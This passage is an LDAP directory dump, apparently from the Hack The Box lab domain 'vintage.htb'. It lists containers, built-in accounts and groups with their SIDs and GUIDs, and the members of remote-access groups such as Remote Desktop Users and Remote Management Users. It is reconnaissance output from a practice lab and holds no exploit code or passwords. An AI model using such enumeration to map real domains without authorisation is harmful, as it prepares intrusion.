whenChanged: 20240605102657.0Z
uSNCreated: 5797
uSNChanged: 5797
showInAdvancedViewOnly: TRUE
name: 7F950403-0AB3-47F9-9730-5D7B0269F9BD
objectGUID:: sWDcptchkE6NIf5qwByg2A==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# 434bb40d-dbc9-4fe7-81d4-d57229f7b080, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
distinguishedName: CN=434bb40d-dbc9-4fe7-81d4-d57229f7b080,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5798
uSNChanged: 5798
showInAdvancedViewOnly: TRUE
name: 434bb40d-dbc9-4fe7-81d4-d57229f7b080
objectGUID:: /Ir85xDf+EyPI8hVspyHig==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# A0C238BA-9E30-4EE6-80A6-43F731E9A5CD, Operations, DomainUpdates, System, vint
 age.htb
dn: CN=A0C238BA-9E30-4EE6-80A6-43F731E9A5CD,CN=Operations,CN=DomainUpdates,CN=
 System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: A0C238BA-9E30-4EE6-80A6-43F731E9A5CD
distinguishedName: CN=A0C238BA-9E30-4EE6-80A6-43F731E9A5CD,CN=Operations,CN=Do
 mainUpdates,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5799
uSNChanged: 5799
showInAdvancedViewOnly: TRUE
name: A0C238BA-9E30-4EE6-80A6-43F731E9A5CD
objectGUID:: XPgtuAKPvkuRA7C4XjFqFQ==
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Windows2003Update, DomainUpdates, System, vintage.htb
dn: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: Windows2003Update
distinguishedName: CN=Windows2003Update,CN=DomainUpdates,CN=System,DC=vintage,
 DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5800
uSNChanged: 5800
showInAdvancedViewOnly: TRUE
name: Windows2003Update
objectGUID:: SdT8h5lNxEikdLnELzevSA==
revision: 9
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# ActiveDirectoryUpdate, DomainUpdates, System, vintage.htb
dn: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
cn: ActiveDirectoryUpdate
distinguishedName: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=vint
 age,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5801
uSNChanged: 5801
showInAdvancedViewOnly: TRUE
name: ActiveDirectoryUpdate
objectGUID:: 0vJzPTSK2k6oijdPJzC5xA==
revision: 16
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=vintage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Password Settings Container, System, vintage.htb
dn: CN=Password Settings Container,CN=System,DC=vintage,DC=htb

# PSPs, System, vintage.htb
dn: CN=PSPs,CN=System,DC=vintage,DC=htb
objectClass: top
objectClass: container
objectClass: msImaging-PSPs
cn: PSPs
distinguishedName: CN=PSPs,CN=System,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 5803
uSNChanged: 5803
name: PSPs
objectGUID:: GlV6WkcniEyTn1zthqwmgw==
objectCategory: CN=ms-Imaging-PSPs,CN=Schema,CN=Configuration,DC=vintage,DC=ht
 b
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# TPM Devices, vintage.htb
dn: CN=TPM Devices,DC=vintage,DC=htb

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20241228160740.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 114730
name: Administrator
objectGUID:: Qyc+Rhjcn0KLuAyC/U7vmg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 133770948506050041
lastLogoff: 0
lastLogon: 133799347213651274
logonHours:: ////////////////////////////
pwdLastSet: 133623200944039546
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR69AEAAA==
adminCount: 1
accountExpires: 0
logonCount: 195
sAMAccountName: Administrator
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101181216.0Z
lastLogonTimestamp: 133798756605057314
msDS-SupportedEncryptionTypes: 16

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20241113141653.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 77871
name: Guest
objectGUID:: joSkqvHcQk+bbRYBAB10og==
userAccountControl: 66082
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 133622272033142823
lastLogoff: 0
lastLogon: 133622203601537067
pwdLastSet: 133759810138332925
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAoYXe77IkM3mNjoR69QEAAA==
accountExpires: 9223372036854775807
logonCount: 18
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20241113141653.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z
lastLogonTimestamp: 133621335857612187
msDS-SupportedEncryptionTypes: 0

# Builtin, vintage.htb
dn: CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: builtinDomain
cn: Builtin
distinguishedName: CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8198
uSNChanged: 8198
showInAdvancedViewOnly: FALSE
name: Builtin
objectGUID:: K2DgZ4kho0a4qq4nGPSAiA==
creationTime: 133610579467479244
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 0
objectSid:: AQEAAAAAAAUgAAAA
serverState: 1
uASCompat: 0
modifiedCount: 91
systemFlags: -1946157056
objectCategory: CN=Builtin-Domain,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605183459.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Administrators, Builtin, vintage.htb
dn: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Administrators
description: Administrators have complete and unrestricted access to the compu
 ter/domain
member: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
member: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
member: CN=Administrator,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 8199
uSNChanged: 12795
name: Administrators
objectGUID:: 8zknvebQ5Eq+YA8T6AhhGQ==
objectSid:: AQIAAAAAAAUgAAAAIAIAAA==
adminCount: 1
sAMAccountName: Administrators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Users, Builtin, vintage.htb
dn: CN=Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Users
description: Users are prevented from making accidental or intentional system-
 wide changes and can run most applications
member: CN=Domain Users,CN=Users,DC=vintage,DC=htb
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
member: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
distinguishedName: CN=Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 8202
uSNChanged: 12381
name: Users
objectGUID:: 6WsTfSMKwkCRRLqnmkGMpg==
objectSid:: AQIAAAAAAAUgAAAAIQIAAA==
sAMAccountName: Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# S-1-5-4, ForeignSecurityPrincipals, vintage.htb
dn: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-4
distinguishedName: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
showInAdvancedViewOnly: TRUE
name: S-1-5-4
objectGUID:: HlUqs5Vl50CncY+FlS9B5w==
objectSid:: AQEAAAAAAAUEAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=vi
 ntage,DC=htb

# S-1-5-11, ForeignSecurityPrincipals, vintage.htb
dn: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-11
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8204
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
memberOf: CN=Users,CN=Builtin,DC=vintage,DC=htb
uSNChanged: 8204
showInAdvancedViewOnly: TRUE
name: S-1-5-11
objectGUID:: 3CW0cH9xOkS4T4ldoMMIAA==
objectSid:: AQEAAAAAAAULAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=vi
 ntage,DC=htb
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Guests, Builtin, vintage.htb
dn: CN=Guests,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Guests
description: Guests have the same access as members of the Users group by defa
 ult, except for the Guest account which is further restricted
member: CN=Domain Guests,CN=Users,DC=vintage,DC=htb
member: CN=Guest,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Guests,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102735.0Z
uSNCreated: 8208
uSNChanged: 12383
name: Guests
objectGUID:: aolmEEEh3UyUzjZmBXvqhA==
objectSid:: AQIAAAAAAAUgAAAAIgIAAA==
sAMAccountName: Guests
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Print Operators, Builtin, vintage.htb
dn: CN=Print Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Print Operators
description: Members can administer printers installed on domain controllers
distinguishedName: CN=Print Operators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 8211
uSNChanged: 12791
name: Print Operators
objectGUID:: 6lcXEltR7kaNHiOJLKxy4Q==
objectSid:: AQIAAAAAAAUgAAAAJgIAAA==
adminCount: 1
sAMAccountName: Print Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Backup Operators, Builtin, vintage.htb
dn: CN=Backup Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Backup Operators
description: Backup Operators can override security restrictions for the sole
 purpose of backing up or restoring files
distinguishedName: CN=Backup Operators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 8212
uSNChanged: 12789
name: Backup Operators
objectGUID:: 3W3+jVWvmEOCtxoHNT4MIw==
objectSid:: AQIAAAAAAAUgAAAAJwIAAA==
adminCount: 1
sAMAccountName: Backup Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Replicator, Builtin, vintage.htb
dn: CN=Replicator,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Replicator
description: Supports file replication in a domain
distinguishedName: CN=Replicator,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605104245.0Z
uSNCreated: 8213
uSNChanged: 12793
name: Replicator
objectGUID:: 8o6INhGMqEOS8PanPaJ9Ag==
objectSid:: AQIAAAAAAAUgAAAAKAIAAA==
adminCount: 1
sAMAccountName: Replicator
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605104245.0Z
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000416.0Z

# Remote Desktop Users, Builtin, vintage.htb
dn: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Remote Desktop Users
description: Members in this group are granted the right to logon remotely
member: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240607215640.0Z
uSNCreated: 8214
uSNChanged: 61559
name: Remote Desktop Users
objectGUID:: gaFizmjBkEe/xpGTEk3EyQ==
objectSid:: AQIAAAAAAAUgAAAAKwIAAA==
sAMAccountName: Remote Desktop Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Network Configuration Operators, Builtin, vintage.htb
dn: CN=Network Configuration Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Network Configuration Operators
description: Members in this group can have some administrative privileges to
 manage configuration of networking features
distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=vintage,DC
 =htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8215
uSNChanged: 8215
name: Network Configuration Operators
objectGUID:: URiM+PlZYEKnyUf8Y62C8A==
objectSid:: AQIAAAAAAAUgAAAALAIAAA==
sAMAccountName: Network Configuration Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Performance Monitor Users, Builtin, vintage.htb
dn: CN=Performance Monitor Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Performance Monitor Users
description: Members of this group can access performance counter data locally
  and remotely
distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8216
uSNChanged: 8216
name: Performance Monitor Users
objectGUID:: xIf/mbaNAUKrxZVvwA9SAw==
objectSid:: AQIAAAAAAAUgAAAALgIAAA==
sAMAccountName: Performance Monitor Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Performance Log Users, Builtin, vintage.htb
dn: CN=Performance Log Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Performance Log Users
description: Members of this group may schedule logging of performance counter
 s, enable trace providers, and collect event traces both locally and via remo
 te access to this computer
distinguishedName: CN=Performance Log Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8217
uSNChanged: 8217
name: Performance Log Users
objectGUID:: 1udgxPDgaEW0hwnNoxdwjg==
objectSid:: AQIAAAAAAAUgAAAALwIAAA==
sAMAccountName: Performance Log Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Distributed COM Users, Builtin, vintage.htb
dn: CN=Distributed COM Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Distributed COM Users
description: Members are allowed to launch, activate and use Distributed COM o
 bjects on this machine.
distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8218
uSNChanged: 8218
name: Distributed COM Users
objectGUID:: zo4P4/eFEUCNUrU4r1D4XQ==
objectSid:: AQIAAAAAAAUgAAAAMgIAAA==
sAMAccountName: Distributed COM Users
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# IIS_IUSRS, Builtin, vintage.htb
dn: CN=IIS_IUSRS,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: IIS_IUSRS
description: Built-in group used by Internet Information Services.
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
distinguishedName: CN=IIS_IUSRS,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8219
uSNChanged: 8222
name: IIS_IUSRS
objectGUID:: KnLzSOdWGkC8YmPgTxQT2Q==
objectSid:: AQIAAAAAAAUgAAAAOAIAAA==
sAMAccountName: IIS_IUSRS
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# S-1-5-17, ForeignSecurityPrincipals, vintage.htb
dn: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-17
distinguishedName: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
showInAdvancedViewOnly: TRUE
name: S-1-5-17
objectGUID:: OeCgpecKuUOBAJhHXhU9fQ==
objectSid:: AQEAAAAAAAURAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=vi
 ntage,DC=htb

# Cryptographic Operators, Builtin, vintage.htb
dn: CN=Cryptographic Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Cryptographic Operators
description: Members are authorized to perform cryptographic operations.
distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8223
uSNChanged: 8223
name: Cryptographic Operators
objectGUID:: IJxml9gWWUCt1Q0Y/rnxlg==
objectSid:: AQIAAAAAAAUgAAAAOQIAAA==
sAMAccountName: Cryptographic Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Event Log Readers, Builtin, vintage.htb
dn: CN=Event Log Readers,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Event Log Readers
description: Members of this group can read event logs from local machine
distinguishedName: CN=Event Log Readers,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8224
uSNChanged: 8224
name: Event Log Readers
objectGUID:: iQVWwI/NBka12utC1djTBA==
objectSid:: AQIAAAAAAAUgAAAAPQIAAA==
sAMAccountName: Event Log Readers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Certificate Service DCOM Access, Builtin, vintage.htb
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Certificate Service DCOM Access
description: Members of this group are allowed to connect to Certification Aut
 horities in the enterprise
distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=vintage,DC
 =htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8225
uSNChanged: 8225
name: Certificate Service DCOM Access
objectGUID:: U3KRJs0z6Ue/E9T8xTdopQ==
objectSid:: AQIAAAAAAAUgAAAAPgIAAA==
sAMAccountName: Certificate Service DCOM Access
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# RDS Remote Access Servers, Builtin, vintage.htb
dn: CN=RDS Remote Access Servers,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: RDS Remote Access Servers
description: Servers in this group enable users of RemoteApp programs and pers
 onal virtual desktops access to these resources. In Internet-facing deploymen
 ts, these servers are typically deployed in an edge network. This group needs
  to be populated on servers running RD Connection Broker. RD Gateway servers
 and RD Web Access servers used in the deployment need to be in this group.
distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8226
uSNChanged: 8226
name: RDS Remote Access Servers
objectGUID:: aU2yTf/9bEmke7RIqut9DA==
objectSid:: AQIAAAAAAAUgAAAAPwIAAA==
sAMAccountName: RDS Remote Access Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# RDS Endpoint Servers, Builtin, vintage.htb
dn: CN=RDS Endpoint Servers,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: RDS Endpoint Servers
description: Servers in this group run virtual machines and host sessions wher
 e users RemoteApp programs and personal virtual desktops run. This group need
 s to be populated on servers running RD Connection Broker. RD Session Host se
 rvers and RD Virtualization Host servers used in the deployment need to be in
  this group.
distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8227
uSNChanged: 8227
name: RDS Endpoint Servers
objectGUID:: VYC8amVjmUWWOdsnkuQeTg==
objectSid:: AQIAAAAAAAUgAAAAQAIAAA==
sAMAccountName: RDS Endpoint Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# RDS Management Servers, Builtin, vintage.htb
dn: CN=RDS Management Servers,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: RDS Management Servers
description: Servers in this group can perform routine administrative actions
 on servers running Remote Desktop Services. This group needs to be populated
 on all servers in a Remote Desktop Services deployment. The servers running t
 he RDS Central Management service must be included in this group.
distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8228
uSNChanged: 8228
name: RDS Management Servers
objectGUID:: 4zX8Ek7G0kagvCCiJ0m2oA==
objectSid:: AQIAAAAAAAUgAAAAQQIAAA==
sAMAccountName: RDS Management Servers
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Hyper-V Administrators, Builtin, vintage.htb
dn: CN=Hyper-V Administrators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Hyper-V Administrators
description: Members of this group have complete and unrestricted access to al
 l features of Hyper-V.
distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=vintage,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8229
uSNChanged: 8229
name: Hyper-V Administrators
objectGUID:: S+o8xtWtK0mkA77OMBLj9A==
objectSid:: AQIAAAAAAAUgAAAAQgIAAA==
sAMAccountName: Hyper-V Administrators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Access Control Assistance Operators, Builtin, vintage.htb
dn: CN=Access Control Assistance Operators,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Access Control Assistance Operators
description: Members of this group can remotely query authorization attributes
  and permissions for resources on this computer.
distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=vintag
 e,DC=htb
instanceType: 4
whenCreated: 20240605102657.0Z
whenChanged: 20240605102657.0Z
uSNCreated: 8230
uSNChanged: 8230
name: Access Control Assistance Operators
objectGUID:: ixMe+9bd/kKkvWmIHjSAyQ==
objectSid:: AQIAAAAAAAUgAAAAQwIAAA==
sAMAccountName: Access Control Assistance Operators
sAMAccountType: 536870912
systemFlags: -1946157056
groupType: -2147483643
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=vintage,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 20240605102735.0Z
dSCorePropagationData: 16010101000001.0Z

# Remote Management Users, Builtin, vintage.htb
dn: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
objectClass: top
objectClass: group
cn: Remote Management Users
description: Members of this group can access WMI resources over management pr
 otocols (such as WS-Management via the Windows Remote Management service). Th
 is applies only to WMI namespaces that grant access to the user.
member: CN=C.Neri,CN=Users,DC=vintage,DC=htb
member: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
